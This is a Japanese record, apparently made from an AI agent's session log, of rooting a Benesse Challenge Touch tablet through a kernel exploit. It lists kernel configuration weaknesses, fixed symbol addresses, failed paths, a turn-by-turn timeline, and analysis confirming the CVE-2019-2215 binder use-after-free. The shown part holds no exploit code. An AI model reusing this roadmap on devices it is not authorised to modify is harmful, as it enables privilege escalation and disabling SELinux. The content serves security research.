# チャレンジタッチ TAB-A03-BR2 root 取得 全過程記録

2026-11-03 10:23 〜 2026-11-07 02:41 (JST) / 122 ターン / 約 40 時間

UART 不可、ソフトウェアのみ、SELinux Enforcing、uid 2000 の adb shell から出発し、
永続 root に到達するまでの判断・実測・失敗・撤回・修正のすべて。

本書は 1 ターンも省かずに全経路を記録した。成功した 1 本のチェーンだけでなく、
**捨てた経路・撤回した主張・端末を壊した操作**をすべて残す。読者が同じ機種で
同じ結論に最短で到達できるようにするためには、成功より失敗の記録の方が価値がある。

---

## 0. この文書について

### 0.1 規模（セッションログから実測）

| 項目 | 値 |
| --- | --- |
| 期間 | 2026-11-03 10:23 〜 2026-11-07 02:41 JST（約 40 時間、4 日） |
| ターン数 | 122 |
| うちユーザー発話 | 34（残りはシステム注入・自動継続・ハーネス通知） |
| ツール呼び出し | 4,507 |
| `pwsh` 実行 | 3,588 |
| ファイル作成 (`write`) | 500 |
| ファイル修正 (`edit`) | 36 |
| ファイル読取 (`read`) | 60 |
| 記憶への活動記録 (`memory_remember`) | 96 |
| 成果物提示 (`present`) | 100 |
| サブエージェント起動 (`subagent`) | 8 |
| セッションログの生サイズ | 141 MB（31,368 レコード）/ 圧縮 23.4 MB |
| ワークスペースの作業ファイル | 372 個（`k*.c` 168 / `b*.c` 81 / `*.sh` 5 / `*.md` 24） |

40 時間のうち、端末が USB から消えて物理操作を待った時間が延べ 6 時間以上ある。
その間も解析は止めず、オフラインでの計算・ソース読解・QEMU 構築を進めた。

### 0.2 記述の規約

- **実測** = 端末またはホストでコマンドを実行して得た出力。再現コマンドを併記する。
- **ソース確認** = GPL 公開ツリー（ローカルに複製した 3.10.33 カーネルソース）の該当行を読んで確定。
- **推定** = 上記 2 つで決まらないもの。必ず「推定」と書く。
- **撤回** = 一度主張したが後に実測で否定したもの。第 15 章に全件を列挙する。
- 数値はすべて 16 進または実測単位のまま。丸めた値は使わない。

### 0.3 なぜ「全過程」を残すのか

この作業は 122 ターンのうち **root を取ったのは T115 の 1 ターン**、**永続化に成功したのは T120 の 1 ターン**だけである。
残りの 120 ターンは、間違ったモデルを立てては実測で壊す作業だった。

とくに次の 3 つは、正しい結論に至るまでに最も時間を食った罠であり、
同じカーネルを触る誰もが踏む。

1. **測定器が壊れていると「0 件」を事実と誤読する。** 実際は自分のバグだった（10.4 節）。
2. **成功したように見える戻り値は、ほぼ常に自分の設定値の関数である。**（第 6 章・第 8 章）
3. **書き込みを伴う「読み取りオラクル」は存在しない。** ゲートは判定と同時に書く（9.3 節）。

### 0.4 最終結果（先に結論）

| 項目 | 状態 | 証拠 |
| --- | --- | --- |
| uid 0 | 達成・永続 | `Uid: 0 0 0 0` |
| 全ケーパビリティ | 達成・永続 | `CapEff: 0000001fffffffff` |
| SELinux 無効化 | 達成・永続 | `enforce = 0` |
| `CAP_SYS_ADMIN` 実動作 | 実測 | `mount tmpfs: OK` |
| `CAP_CHOWN` 実動作 | 実測 | `chown to root: OK` |
| root 専用ファイル | 実測 | `/proc/kmsg`, `/data/misc/keystore/user_0`, `/dev/block/mmcblk0` |
| 再起動後の自動復帰 | 2 回連続で実証 | 起動直後に `myroot` 常駐、`enforce=0` |
| `/system` 書き込み | 達成 | `BLKROSET(0)` + `MS_REMOUNT` |
| 復旧経路 | 確保 | recovery が permissive + root adb、`misc` へ書き込み可 |

---

## 1. 対象と制約

### 1.1 端末

| 項目 | 値 | 取得元 |
| --- | --- | --- |
| 製品 | チャレンジタッチ / チャレンジパッド2 | 筐体・fingerprint |
| 型番 | TAB-A03-BR2 | `ro.product.model` |
| USB ID | `0bb4:4e16` (HTC 割当、SoC は Marvell) | `lsusb` |
| シリアル | `ADB-SERIAL`（実値は非公開） | `lsusb -v` |
| OS | Android 5.1 (API 22) | `getprop` |
| カーネル | `3.10.33 #2 SMP PREEMPT` / 2019-11-25 build | `/proc/version` |
| SoC | Marvell PXA1928 (Cortex-A53, ARMv8.0, part `0xd03`) | `/proc/cpuinfo` |
| メモリ | 1,973,852 kB（約 1.88 GiB） | `/proc/meminfo` |
| 初期権限 | uid 2000 (`shell`), `CapEff=0` | `id`, `/proc/self/status` |
| SELinux | Enforcing (`u:r:shell:s0`) | `getenforce` |
| ビルド | `user` / `release-keys`, `ro.secure=1`, `ro.debuggable=0` | `getprop` |
| オンライン CPU | **cpu0 のみ**（`/sys/devices/system/cpu/online` = `0`） | sysfs |
| バッテリー | 開始時 3%（充電中に 86% まで回復） | `dumpsys battery` |

CPU が 1 コアしかオンラインでないことは、以降のすべての競合設計に効く。
SLUB の per-CPU フリーリストは実質 1 本しかなく、「同じ CPU で free → alloc」は
「同じタスクで連続して行う」ことを意味する。

### 1.2 ホスト

| 項目 | 値 |
| --- | --- |
| 接続経路 | 手元 PC から SSH 経由で Linux ホストの adb を操作（接続先・ユーザー名は非公開、sudo パスワードレス） |
| USB | 内蔵ハブ `1-3` の Port 1（`1-3.1`）、High Speed 480Mbps |
| adb | 1.0.41 / 34.0.5。作業ユーザーは plugdev 未加入のため `sudo -n adb` で root の adb server を使う |
| クロスコンパイラ | `aarch64-linux-gnu-gcc 14.2.0`、`-static -O2` |
| 解析 | `pahole`、`aarch64-linux-gnu-objdump`、`aarch64-linux-gnu-addr2line` |

`adb shell` は標準入力を消費する。SSH 経由でスクリプトを流し込む場合、
内部の `adb` 呼び出しすべてに `< /dev/null` を付ける必要がある。
付けないと後続のスクリプト行が adb に吸われ、出力が途中で崩れる。

### 1.3 ユーザー提示の制約

> UARTが使える穴が一切ありません
> ソフトウェアなどで攻撃する以外手立てがありません

物理アクセスは USB のみ。シリアルコンソール、JTAG、テストポイントは使えない。
したがって攻撃面は「adb shell から到達できるカーネルインタフェース」に限定される。
この制約は最後まで破られなかった。UART 手順書（`uart-root-procedure.md`、実測パーティション値と
`magiskboot` の動作確認を含む）は作成したが、一度も実行していない。

### 1.4 カーネル設定（`.config` から実測）

```
CONFIG_MODULES=y
CONFIG_MODULE_SIG            存在しない（署名検証なし）
CONFIG_MODULE_FORCE_UNLOAD=y
CONFIG_KEXEC=y
CONFIG_DEVMEM=y
CONFIG_KALLSYMS_ALL=y
CONFIG_SLUB=y                  CONFIG_SLUB_DEBUG=y（SLUB_DEBUG_ON は未設定）
CONFIG_SECURITY_SELINUX=y      DEVELOP=y / BOOTPARAM なし
CONFIG_HIGHMEM               無効
CONFIG_DEBUG_RODATA          無効（STRICT_KERNEL_RWX も無効）
CONFIG_DM_VERITY             無効
CONFIG_RANDOMIZE_BASE         存在しない（KASLR 無効）
CONFIG_IP_DCCP                未設定
CONFIG_NETFILTER              未設定
CONFIG_MMP_IOMMU              未設定 / CONFIG_ARM_SMMU=y
CONFIG_ARM64_PAN              3.10 には存在しない（ARMv8.0 で PAN 自体が無い）
panic_on_oops=1
panic=1
```

このうち攻撃を可能にしたのは次の 5 点。

1. モジュール署名検証なし → 任意の `.ko` がロード可能（ケーパビリティさえあれば）
2. KASLR なし → シンボルアドレスが固定。ただし自前ビルドとの差分は一定でない（1.6 節）
3. `DEBUG_RODATA` なし → カーネルテキスト `/data` が書き換え可能
4. dm-verity / AVB なし → システムパーティションの改変を検証しない
5. `SECURITY_SELINUX_DEVELOP=y` → グローバル `int selinux_enforcing` が存在する

一方、次の 3 点が全経路を強く制限した。

1. `panic_on_oops=1` + `panic=1` → ポインタを 1 バイト誤ると即再起動。UART が無いので復旧は物理操作のみ
2. SELinux Enforcing の capability クラスが `shell` ドメインを一律拒否（9.7 節・第 13 章）
3. オンライン CPU が 1 本 → free と alloc を同一タスク・同一 CPU に固定する必要がある

### 1.5 メモリレイアウト（実測）

```
VA_BITS              = 39
PAGE_OFFSET          = 0xffffffc000000000
PAGE_OFFSET_COHERENT = 0xffffff8000000000
VMALLOC_END          = 0xffffffbbffff0000
vmemmap              = 0xffffffbc00000000
sizeof(struct page)  = 56
MEMSTART (memstart)  = 0x01000000
TASK_SIZE_64         = 1 << 39
KERNEL_DS            = -1UL
```

線形マップの式（実測で確定）:

```
linear = 0xffffffc000000000 + (phys - 0x01000000)
```

物理 `0x01000000` 〜 `0x7effffff`（約 2 GB）が
仮想 `0xffffffc000000000` 〜 `0xffffffc07effffff` に対応する。

`/proc/iomem` の実測:

```
01000000-7fffffff : System RAM
01080000-01ab7c63 : Kernel code
01b4a000-01ce212f : Kernel data
```

**カーネルイメージ自身が線形マップの中にある。** `_text` の仮想アドレス
`0xffffffc000080000` と物理 `0x01080000` を上式に当てはめると一致する。
したがって `core_pattern` も `modprobe_path` も `selinux_enforcing` も
「到達範囲」としては近い。問題は値の自由度だけだった（第 14 章）。

### 1.6 主要シンボル（`System.map`、物理アドレス）

| シンボル | 物理 | 仮想 |
| --- | --- | --- |
| `_text` | `0x01080000` | `0xffffffc000080000` |
| `_etext` | — | `0xffffffc000b639b4` |
| `__start_rodata` | — | `0xffffffc000735000` |
| `modprobe_path` | `0x01c02d08` | `0xffffffc000c02d08` |
| `core_pattern` | `0x01c13fb8` | `0xffffffc000c13fb8` |
| `init_cred` | `0x01c04c88` | `0xffffffc000c04c88` |
| `file_caps_enabled` | `0x01c01ffc` | `0xffffffc000c01ffc` |
| `linux_banner` | `0x01735090` | `0xffffffc000735090` |
| `selinux_enabled` | `0x01c22260` | `0xffffffc000c22260` |
| `modules_disabled` | `0x01d07bd8` | `0xffffffc000d07bd8` |
| `selinux_enforcing` | `0x01d35f6c` | `0xffffffc000d35f6c` |
| `ss_initialized` | `0x01d395e8` | `0xffffffc000d395e8` |
| `policydb` | — | `0xffffffc000d39410` |
| `sidtab` | — | `0xffffffc000d395f8` |
| `pxa_ion_iommu_mapping` | — | `0xffffffc000d45298` |
| `avc_node_cachep` | — | `0xffffffc000d34740` |
| `avc_cache` | — | `0xffffffc000d34758` |

**シンボル差分は移植できない。** 端末のカーネルと自前ビルド（ma04_defconfig）で
同じ関数のアドレスを比べた実測:

| 関数 | 端末 | 自前ビルド | 差 |
| --- | --- | --- | --- |
| `__free_pages` | `0xffffffc0001530e4` | `0xffffffc000154ae0` | −0x1a00 |
| `binder_deferred_func` | `0xffffffc00054a640` | `0xffffffc000529a20` | +0x20c20 |

差が一定でない。コンフィグ差で関数の並び順自体が異なるため、単純な補正では使えない。
`commit_creds` や `init_cred` の「自前ビルドの固定アドレス」を使う道はこれで閉じた。
以降の設計は **必ず実機から実アドレスを取る** ことを前提にする。

最終的に使ったのは ION が開示する物理アドレスと、線形マップの式だけだった。

---

## 2. 全体像

### 2.1 局面の一覧

本文は局面ごとに章を分けている。章番号とターン範囲を対応させて読む。

| 章 | 期間 | 内容 | 結果 |
| --- | --- | --- | --- |
| 3. 偵察 (T1–T3) | 11-03 10:23–15:25 | 端末調査、防御状態の実測、UART 以外の全経路の否定 | 報告書 3 本、攻撃面 = カーネル exploit のみ |
| 4. binder 前期 (T4–T34) | 11-03 15:25–11-05 11:53 | CVE-2019-2215 の該当確認、ゲート、ドレイン、再確保、QEMU 構築 | リーク成立、書込みの主張は撤回、QEMU 起動 |
| 5. QEMU 完全チェーン (T35–T41) | 11-05 11:53–21:26 | cred 書換え、ケーパビリティ、donor cred | uid 0 + kernel ドメイン 3/3 |
| 6. 実機 binder の壁 (T39–T52) | 11-05 18:41–11-06 05:53 | readv 0/14000、膨張の誤認と撤回、計器の盲目 | 書込み未達、原因を 5 つに分解 |
| 7. 幾何と計器の総点検 (T50–T62) | 11-06 04:37–07:17 | dev.bin 解析、iovec 私的コピー、fault_in、modprobe 転換 | 機構は確定、任意書込みは閉包 |
| 8. 閉包の確定と ION の発見 (T63–T105) | 11-06 07:17–17:24 | `BINDER_THREAD_EXIT` 誤り、reclaim 成功、ION 型バイト総当たり、値制約の転化設計 | reclaim 5/6、ION の 4 バイト書込み成立 |
| 9. ION 書込みの確立 (T107–T113) | 11-06 17:29–19:39 | ゲート＝テスト兼書込みの自己証明、cred 発見、AVC 仮説、停止 | `CAP_SYS_MODULE` 付与、壁の数学を確定 |
| 10. AVC 突破と root (T114–T115) | 11-06 23:18–11-07 01:09 | `tclass=4` の発見、窓走査、モジュール投入 | **root 取得**（6 ストアで安定） |
| 11. 永続化と復旧 (T116–T120) | 11-07 01:09–02:35 | `/system` rw、フック、ドメインの誤解、`calibinit.sh`、recovery | **永続 root**、復旧経路確保 |
| 12–19. 総括 | 記録 | 値の一覧、撤回 45 件、教訓、付録 | 本書 |

### 2.2 122 ターン全一覧

「宣言」はそのターンで最初に書いた作業宣言（1 行目）。章番号は 2.1 節の表に対応する。

| # | 開始 (JST) | 章 | ユーザー | 最初の宣言 |
| ---: | --- | --- | --- | --- |
| 1 | 11-03 10:23 | 3 | 端末を調査して結果を書いて | SSH 設定と調査手段を確認 |
| 2 | 11-03 11:06 | 3 | — | 監視ジョブの結果を確認 |
| 3 | 11-03 14:39 | 3 | TAB-A03-BR2 / root を強取 | 攻撃面を実測で洗い出す |
| 4 | 11-03 15:25 | 4 | — | CVE-2019-2215 の該当性を実カーネルソースで確認 |
| 5 | 11-03 15:29 | 4 | UART 不可 / ソフトウェアのみ | 最有力のソフトウェア経路を実測開始 |
| 6 | 11-03 15:36 | 4 | 続けて | ビルドの現在地を確認して再開 |
| 7 | 11-03 15:59 | 4 | 次は? | binder サーバ状態の実装 |
| 8 | 11-03 16:28 | 4 | 知識がないので最有力で | CPU 固定＋フォールト検知 |
| 9 | 11-03 16:35 | 4 | spawn で呼んで | spawn で追加調査を並列化 |
| 10 | 11-03 16:36 | 4 | まだ fork? | fork サブエージェント投入 |
| 11 | 11-03 16:37 | 4 | gemini-3.8-flash で | 調査エージェント群を並列実行 |
| 12 | 11-03 16:39 | 4 | — | — |
| 13 | 11-04 21:14 | 4 | gemini のみ許可 | read_size=256 に修正 |
| 14 | 11-04 21:24 | 4 | ベストを尽くして | UAF を任意書き込みに昇格 |
| 15 | 11-04 21:53 | 4 | 任せた | DEL の順序誤りを特定 |
| 16 | 11-04 22:02 | 4 | 続けて | iov[4] がコピーを止めていた |
| 17 | 11-04 22:07 | 4 | まだ道はある | 1MB パイプで writev が即完了 |
| 18 | 11-04 22:15 | 4 | 続けて / 信じてる | proc->wait 側の UAF |
| 19 | 11-04 22:22 | 4 | 続けて | UAF の因果を確定する対照実験 |
| 20 | 11-04 22:26 | 4 | まだいける | transaction_stack が残るか |
| 21 | 11-04 22:37 | 4 | 自分を疑え | スレッド ID のずれ |
| 22 | 11-04 22:54 | 4 | 窓を絶対に突破したい | proc 側の登録経路とスラブサイズ |
| 23 | 11-04 23:14 | 4 | 寝るので全部やって | 目標設定と突破口の実装 |
| 24 | 11-05 02:08 | 4 | — | 判定ロジックの欠陥を修正 |
| 25 | 11-05 03:33 | 4 | — | リークの内容を検算 |
| 26 | 11-05 03:51 | 4 | 復旧させた | QEMU カーネル完走、initramfs |
| 27 | 11-05 06:53 | 4 | — | 書き込みプリミティブの実装 |
| 28 | 11-05 07:19 | 5 | — | 任意読み出しの実装 |
| 29 | 11-05 08:04 | 5 | — | 検証済みアドレスだけで任意読み出し |
| 30 | 11-05 09:22 | 5 | — | 復帰状況とウォッチャー |
| 31 | 11-05 09:29 | 5 | — | リーク距離 61MB、設計見直し |
| 32 | 11-05 09:37 | 5 | — | addr_limit 書換え方式 |
| 33 | 11-05 09:48 | 5 | — | QEMU でゲート成立 |
| 34 | 11-05 10:23 | 5 | — | ゲート 2000/2000 |
| 35 | 11-05 11:53 | 5 | — | uid 2000→0 昇格に成功（QEMU） |
| 36 | 11-05 14:46 | 5 | — | 3 回連続で確認 |
| 37 | 11-05 16:15 | 5 | — | 3/3 再現、リトライ検証 |
| 38 | 11-05 17:26 | 5 | — | ケーパビリティ欠如を修正 |
| 39 | 11-05 18:41 | 6 | 端末を起こした | 端末復帰と自動投入 |
| 40 | 11-05 20:58 | 6 | 続けて | 偽 cred 方式へ作り直す |
| 41 | 11-05 21:26 | 6 | 続けて | binder_proc→tsk 経路 |
| 42 | 11-05 23:28 | 6 | root 取れればなんでも | 膨張成立を厳格ゲートで検証 |
| 43 | 11-06 00:10 | 6 | — | writev 転用 |
| 44 | 11-06 01:38 | 6 | — | ticket lock が書く値 17 |
| 45 | 11-06 02:34 | 6 | — | list_del の書込みから再導出 |
| 46 | 11-06 03:10 | 6 | — | 装置用レイアウトで aim 確認 |
| 47 | 11-06 03:34 | 6 | — | 未マップアドレス実験 |
| 48 | 11-06 03:57 | 6 | — | spin unlock の書く値 |
| 49 | 11-06 04:26 | 6 | — | 非枯渇パイプで膨張なし |
| 50 | 11-06 04:37 | 7 | — | リークが再確保を証明するか |
| 51 | 11-06 05:25 | 7 | — | 膨張は write 方向のみ |
| 52 | 11-06 05:53 | 7 | — | QEMU は再確保を再現しない |
| 53 | 11-06 06:14 | 7 | — | 実機ダンプだけで機構を証明 |
| 54 | 11-06 06:22 | 7 | — | access_ok 仕様と aim 修正 |
| 55 | 11-06 06:30 | 7 | — | aim のバッファ境界制約 |
| 56 | 11-06 06:47 | 7 | — | ユーザ空間からの幾何検証は不能 |
| 57 | 11-06 06:56 | 7 | — | do_write の 3 バグ修正 |
| 58 | 11-06 06:59 | 7 | — | 書き込み経路成立の理由をソースで確定 |
| 59 | 11-06 07:03 | 7 | — | fault_in 副作用を回避する 2 段書き込み |
| 60 | 11-06 07:06 | 7 | — | 残り 2 つの算術誤り |
| 61 | 11-06 07:08 | 7 | — | modprobe_path へ戦略転換 |
| 62 | 11-06 07:12 | 7 | — | — |
| 63 | 11-06 07:17 | 8 | デバイス復旧した | 安全な aw3 で書き込み検証 |
| 64 | 11-06 07:42 | 8 | — | ゲート再試行ループが逆効果 |
| 65 | 11-06 07:56 | 8 | — | broot3 の機構解明、aim 不要 |
| 66 | 11-06 08:07 | 8 | — | kx の 2 バグ |
| 67 | 11-06 08:32 | 8 | — | 単一 CPU と binder_thread レイアウト |
| 68 | 11-06 08:44 | 8 | — | ゲート 8/8、干渉源は fork |
| 69 | 11-06 08:54 | 8 | — | epoll ADD が head を書く |
| 70 | 11-06 09:07 | 8 | — | BINDER_THREAD_EXIT の番号誤り |
| 71 | 11-06 09:26 | 8 | — | free 修正を実機確認 |
| 72 | 11-06 09:35 | 8 | — | SLUB の fast/slow path |
| 73 | 11-06 09:42 | 8 | — | ゲート kind1 60/60 |
| 74 | 11-06 09:50 | 8 | — | コピー計算のバグ |
| 75 | 11-06 09:55 | 8 | — | reclaim 成功、meter が変化 |
| 76 | 11-06 10:23 | 8 | — | Dirty COW の修正確認 |
| 77 | 11-06 10:58 | 8 | — | list_del を狙う実証実験 |
| 78 | 11-06 11:27 | 9 | — | type=-1 呼び出しを探す |
| 79 | 11-06 11:53 | 9 | — | 宣言長の算術修正 |
| 80 | 11-06 12:07 | 9 | — | 線形書込みを任意書込みへ |
| 81 | 11-06 12:30 | 9 | — | 正直な報告に切り替え |
| 82 | 11-06 13:07 | 9 | — | 別面を実測で洗う |
| 83 | 11-06 13:23 | 9 | — | ION の ioctl 型バイト総当たり |
| 84 | 11-06 13:50 | 9 | — | mmap の pgoff 境界 |
| 85 | 11-06 13:59 | 9 | — | 他プロセスページへの書込み |
| 86 | 11-06 14:09 | 9 | — | 解放 ION ページのリーク |
| 87 | 11-06 14:20 | 9 | — | スラブ回収経路 |
| 88 | 11-06 14:35 | 9 | — | 未検査 ioctl の探索 |
| 89 | 11-06 15:37 | 9 | — | 端末停止中、オフライン解析 |
| 90 | 11-06 16:01 | 9 | — | ハブのポートリセット |
| 91 | 11-06 16:16 | 9 | — | pipe_write の範囲外書込み |
| 92 | 11-06 16:23 | 9 | — | 資格情報ページの ION 読み戻し |
| 93 | 11-06 16:28 | 9 | — | 2 アルファベット識別 |
| 94 | 11-06 16:33 | 9 | — | pipe_buffer.len で全 RAM 読み出し |
| 95 | 11-06 16:37 | 9 | — | 1 ストアで全 RAM 読み出し |
| 96 | 11-06 16:40 | 9 | — | k113/k114 のバグ 3 つ |
| 97 | 11-06 16:51 | 9 | — | 2 経路の整理 |
| 98 | 11-06 17:00 | 9 | — | 自己検証可能な読み出し |
| 99 | 11-06 17:02 | 9 | — | 棚卸しと値制御の最後の候補 |
| 100 | 11-06 17:06 | 9 | — | 0x80000000 は CAP_SETFCAP |
| 101 | 11-06 17:10 | 9 | — | 一意な基点で再構築 |
| 102 | 11-06 17:13 | 9 | — | 確保順序の誤り |
| 103 | 11-06 17:17 | 9 | — | cred_jar を満杯にしてから解放 |
| 104 | 11-06 17:19 | 9 | — | capget(child) で第三者検証 |
| 105 | 11-06 17:22 | 9 | — | cap_bset 依存を排除 |
| 106 | 11-06 17:24 | 9 | 再起動しても良い? | 再起動可否の回答 |
| 107 | 11-06 17:29 | 10 | — | k126 で CAP_SYS_MODULE の IOVA |
| 108 | 11-06 17:56 | 10 | — | ストライドずれ、停止して修正 |
| 109 | 11-06 18:32 | 10 | — | cap_effective=0x80010000 を確認 |
| 110 | 11-06 18:58 | 10 | — | 監査ログに sys_module 拒否 |
| 111 | 11-06 19:05 | 10 | — | avd_init の不明 SID |
| 112 | 11-06 19:28 | 10 | — | avc tclass はゲートで厳密にテスト可能 |
| 113 | 11-06 19:39 | 10 | 終わったら止めて | 調査を締めて停止 |
| 114 | 11-06 23:18 | 11 | トークン追加した、続けて | ゴール復帰、大容量確保 |
| 115 | 11-06 23:51 | 11 | — | 段階的走査に切り替え |
| 116 | 11-07 01:09 | 11 | — | root 維持、`/system/bin` 修復 |
| 117 | 11-07 01:22 | 11 | 工場出荷前に戻す? で再起動 | ブートイメージ永続化の準備 |
| 118 | 11-07 01:50 | 11 | — | パーティションと生ブロック書込み |
| 119 | 11-07 02:00 | 11 | メモリ不足で落ちた、起こした | root 取り直し、remount 再検証 |
| 120 | 11-07 02:35 | 12 | 次行こう | 復旧経路を検証 |
| 121 | 11-07 02:40 | 12 | ありがとうございました | 完了報告とゴールクローズ |
| 122 | 11-07 02:41 | 12 | 超詳細な全過程を保存 | 詳細ドキュメントの書き出し |

---

## 3. 偵察（T1–T3、11-03 10:23–15:25）

### 3.1 USB 層の実測（T1–T2）

端末は内蔵ハブ `1-3` の Port 1 に High Speed で接続されている。

```
/:  Bus 001.Port 001: Dev 001, Class=root_hub, Driver=xhci_hcd/12p, 480M
    |__ Port 003: Dev 002, If 0, Class=Hub, Driver=hub/4p, 480M
        |__ Port 001: Dev 007, If 0, Class=Vendor Specific Class, Driver=[none], 480M
        |__ Port 001: Dev 007, If 1, Class=Vendor Specific Class, Driver=[none], 480M
```

接続直後に 3 回の再列挙が起き、VID/PID が `0bb4:4e16` → `0474:031a` → `0bb4:4e16` と変化した。
`0474` は Sanyo Electric の割当。Android の USB モード切替に伴うものと推定。
`error -71`（EPROTO）が 1 回だけ出たが以降は安定した。

インターフェース:

| If | クラス | Sub | Proto | EP | iInterface |
| --- | --- | --- | --- | --- | --- |
| 0 | 255 | 255 | 0 | 0x81/0x01 Bulk 512B、0x82 Int 28B | MTP |
| 1 | 255 | 66 | 1 | 0x83/0x02 Bulk 512B | （なし） |

If 1 の 66/1 が ADB。両方が同時に有効（`mtp,adb`）。

### 3.2 防御状態の実測（T3）

| 項目 | 実測値 | コマンド |
| --- | --- | --- |
| ビルド種別 | `user` / `release-keys` | `getprop ro.build.type` |
| `ro.secure` / `ro.debuggable` | `1` / `0` | `getprop` |
| `ro.adb.secure` | `1` | `getprop` |
| SELinux | `Enforcing` | `getenforce` |
| カーネル | `3.10.33 #2 SMP PREEMPT 2019-11-25` | `cat /proc/version` |
| セキュリティパッチ表示 | `2018-03-05` | `getprop` |
| KASLR | `ma04_defconfig` に `RANDOMIZE_BASE` なし | GPL ソース |
| カーネルログ | **読める**。`logcat -b kernel -d` と `/proc/last_kmsg` | 実測（T3 で訂正） |
| kallsyms | 読めるがアドレスは全て 0 埋め | `cat /proc/kallsyms` |
| boot パーティション | 読めない（Permission denied） | `dd if=/dev/block/...by-name/boot` |
| 既存 root 資産 | 無し（su / Magisk / KingRoot 不在） | `ls /system/xbin/su`、`pm list packages` |

**T3 の途中で 1 つ訂正した。** 当初「dmesg 不可 → クラッシュ解析は盲目」と書いたが、
`logcat -b kernel -d` と `/proc/last_kmsg` は shell（log グループ）から読める。
これは以後の全設計を変えた。パニックしても手がかりが残るからである。

### 3.3 潰した経路（すべて実測）

| 経路 | 実測結果 |
| --- | --- |
| `adb root` | `adbd cannot run as root in production builds` |
| `adb remount` | `remount of system failed: Permission denied` |
| update.zip 署名 | SANYO 独自自己署名。モジュラス SHA-256 `9460ba93…` ≠ AOSP testkey `8157b049…` |
| boot / recovery / misc | `root:root 0600`、shell から読み書き不可 |
| DachaService | `userId=1000`（system）。root ではない |
| debuggable なシステムアプリ | 無し。`run-as` 不可（debuggable は Termux のみ） |
| fastboot | `adb reboot bootloader` → `1286:8165` TD2 / iInterface `FLASHBVY`。fastboot ではない |
| Dirty COW (CVE-2016-5195) | 修正済み（`FOLL_COW` が `mm/memory.h` に存在） |
| SysV IPC（msgget） | SELinux で EACCES |
| `add_key` | `errno=13`（全 type 拒否、SELinux） |
| `/dev/mem`, `/dev/kmem` | Permission denied / 存在しない |
| setuid バイナリ | `/system/bin` 225 エントリ中 **0 個** |
| `/dev/galcore`, `/dev/dri` | 存在しない |
| run-as（Benesse 系 6 パッケージ） | 全拒否 |

OTA 鍵の照合は実物で行った。`/system/etc/security/otacerts.zip` を取り出し、
中の `testkey.x509.pem` の subject が
`C=JP, ST=Tottori-pref, L=Tottori-city, O=SANYO, OU=development`。
AOSP の公開 testkey とはモジュラスの SHA-256 が一致しない。
したがって SANYO の RSA 秘密鍵なしに正規署名は作れない。update.zip 経路はここで閉じた。

bootloader の実測も決定的だった。T3 で `adb reboot bootloader` を実行したところ、
端末は `1286:8165` "TD2" として再列挙され、`fastboot devices` には現れなかった。
ディスクリプタは class/subclass/protocol = ff/ff/ff、iInterface = `FLASHBVY`。
GPL ソースの U-Boot には `CONFIG_USBDOWNLOAD_GADGET` はあるが、`FLASHBVY` の実装本体は
含まれていない（`grep -rin flashbvy` で 0 件）。Linux 用の公開ツールも存在しない。
このモードから戻すには 10 秒の電源長押しが必要で、実際に 1 回それが必要になった。

### 3.4 `/dev` の権限（後に効く）

uid 2000 から開けるデバイス:

| デバイス | 権限 | 到達性 |
| --- | --- | --- |
| `/dev/ion` | 0666 | **開ける** |
| `/dev/binder` | 0666 | 開ける |
| `/dev/ashmem` | 0666 | 開ける |
| `/dev/null` `zero` `full` `random` | 0666 | 開ける |
| `/dev/tty` `/dev/ptmx` | 0666 | 開ける |
| `/dev/acipc` | 0600 root | 不可 |
| `/dev/kmsg` | 0600 root | 不可 |
| `/dev/i2c-0..4` | 0600 root | 不可 |
| `/dev/gpu_freq_*` | 0600 root | 不可 |
| `/dev/sw_sync` | 0600 root | 不可 |
| `/dev/watchdog` | 0600 root | 不可 |

5.1 の SELinux には `allowxperm` による ioctl 番号フィルタが無いので、
`chr_file` の ioctl 許可は「任意の ioctl 番号が通る」ことを意味する。
後に `/dev/ion` の未知 ioctl を総当たりする根拠になった。

### 3.5 UART 手順書（実行せず）

T3 で `uart-root-procedure.md` を作った。実機のパーティション値を実測で埋め、
`magiskboot`（Magisk v23.0 の 32bit 静的バイナリ）の動作確認、
`default.prop` パッチの合成 ramdisk での検証（`ro.secure=0` / `ro.debuggable=1`、
`init` の 0750・root:root 保持）まで済ませた。

```
boot = sector 0x28000、0x8000 セクター（16MB）
recovery = 0x3000、0x5000 セクター
misc = 0x18000
```

必要なのは 1.8V 対応の USB-UART アダプタ、TX/RX/GND への接触、FAT16 の microSD。
ユーザーの制約（UART 不可）により **一度も実行していない**。
本書の全成果はこの代替経路なしで得たものである。

### 3.6 偵察の結論

USB と adb だけで完結する「設定ミス系」の経路は存在しない。
残るのはカーネル exploit だけで、材料は揃っている。

- 3.10.33、KASLR なし、SLUB、SELinux Enforcing、`panic_on_oops=1`
- `/dev/binder`、`/dev/ashmem`、`/dev/ion` が 0666
- カーネルログが読める（クラッシュしても手がかりが残る）
- ネイティブ実行可能（静的 aarch64 バイナリを `/data/local/tmp` で実行、uid 2000 で動作）

---

## 4. binder 前期と QEMU 構築（T4–T34、11-03 15:25–11-05 11:53）

### 4.1 CVE-2019-2215 の該当確認（T4、サブエージェント）

GPL 公開ツリーの `binder.c` を直接読んで確認した。

```
2568: static unsigned int binder_poll(struct file *filp, struct poll_table_struct *wait)
2587:         poll_wait(filp, &proc->wait, wait);
2593:         poll_wait(filp, &thread->wait, wait);
2527: static void binder_free_thread(struct binder_proc *proc, struct binder_thread *thread)
2707: case BINDER_THREAD_EXIT:  ->  binder_free_thread(proc, thread)  ->  kfree(thread)
```

`binder_free_thread` は `binder_release_work(&thread->todo)` と `kfree(thread)` だけで、
`wake_up_poll(&thread->wait, POLLHUP|POLLFREE)` が無い（`binder.c` 全体で
`wake_up_poll` の出現回数 **0**）。修正 `f5cb779` の内容そのものが欠けている。
`BINDER_LOOPER_STATE_POLL` も存在しない。

したがって `epoll` の `eppoll_entry` が解放済み waitqueue を指したまま残る UAF が成立する。
到達に必要なのは `/dev/binder`（0666）のみ。

候補 CVE の該当性も表にした。

| CVE | 3.10 該当 | arm64 公開 PoC |
| --- | --- | --- |
| 2019-2215 binder UAF | **する（実測）** | あり |
| 2019-2025 binder | 未確認 | 実質なし |
| 2018-9568 sock 型混同 | **する（実測）** | 確認できず |
| 2019-18683 vivid | 到達不可 | 一般 Linux のみ |
| 2020-0041 binder | しない（推定） | あり（Pixel 3a） |
| 2019-2181 binder | しない（実測） | なし |

`2025` は ashmem ではなく binder（`binder_thread_read`/`BC_FREE_BUFFER` の UAF、
A-116855682、2019-03 修正）で、3.10 は `binder_alloc` 分割前なので修正適用不能。
`0041`/`2181` は `num_valid` / `secctx` が 3.10 に存在しないため非該当。
`18683` は `/dev/video` 非到達。

